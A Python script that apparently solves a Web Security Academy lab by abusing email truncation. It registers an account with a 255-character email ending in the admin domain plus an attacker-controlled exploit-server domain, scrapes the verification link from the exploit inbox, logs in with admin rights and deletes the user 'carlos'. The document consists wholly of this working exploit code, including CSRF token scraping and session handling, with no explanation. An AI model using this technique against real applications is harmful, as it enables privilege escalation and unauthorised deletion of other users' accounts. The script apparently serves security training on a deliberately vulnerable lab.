import requests
import bs4
from string import ascii_lowercase
import random

EXPLOIT_MAIL_DOMAIN = "exploit-0a1a004f034a7a7f84dea3c701900082.exploit-server.net"
ADMIN_MAIL_DOMAIN = "dontwannacry.com"
PAYLOAD_LEN = 255 - (len("@"+ADMIN_MAIL_DOMAIN))
PAYLOAD = "".join([ascii_lowercase[random.randint(0,25)] for i in range(PAYLOAD_LEN)])  + "@" + ADMIN_MAIL_DOMAIN + "." + EXPLOIT_MAIL_DOMAIN
RANDOM_USERNAME_PASSWORD = "".join([ascii_lowercase[random.randint(0,25)] for i in range(5)])

DOMAIN = "0aa600f603db7af68474a498000200ea.web-security-academy.net"

HEADERS = {
    "Host": DOMAIN,
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": ""
}

def register():
    response = requests.get(f"https://{DOMAIN}/register", headers=HEADERS)
    HEADERS["Cookie"] = "session=" + response.headers["Set-Cookie"].split("session=")[1].split(";")[0]  + ";"
    response = requests.get(f"https://{DOMAIN}/register", headers=HEADERS)
    csrf_token = response.text.split('csrf" value="')[1].split('"')[0]
    data = {
        "csrf": csrf_token,
        "username": RANDOM_USERNAME_PASSWORD,
        "email": PAYLOAD,
        "password": RANDOM_USERNAME_PASSWORD
    }
    response = requests.post(f"https://{DOMAIN}/register", headers=HEADERS, data=data)
    if "Your username is" in response.text:
        print("Registered successfully")
        print("COOKIES: ", response.request.headers["Cookie"])
    HEADERS["Cookie"] = response.request.headers["Cookie"]

def verify_email():
    response = requests.get(f"https://{EXPLOIT_MAIL_DOMAIN}/email")
    soup = bs4.BeautifulSoup(response.text, "html.parser")

    url = soup.find_all("a", target="_blank")[0].get("href")
    response = requests.get(url)

def get_csrf_token_login():
    response = requests.get(f"https://{DOMAIN}/login", headers=HEADERS)
    csrf_token = response.text.split('csrf" value="')[1].split('"')[0]
    return csrf_token

def login():
    csrf_token = get_csrf_token_login()
    data = {
        "csrf": csrf_token,
        "username": RANDOM_USERNAME_PASSWORD,
        "password": RANDOM_USERNAME_PASSWORD
    }
    response = requests.post(f"https://{DOMAIN}/login", headers=HEADERS, data=data)


    if "Your username is" in response.text:
        print("Logged in successfully")
        print("COOKIES: ", response.request.headers["Cookie"])

    HEADERS["Cookie"] = response.request.headers["Cookie"]

def delete_user():
    url = f"https://{DOMAIN}/admin/delete?username=carlos"
    response = requests.get(url, headers=HEADERS)
    print("Deleted user carlos")
    print("PWNED!!!")

print(PAYLOAD)
print(RANDOM_USERNAME_PASSWORD)
register()
verify_email()
login()
delete_user()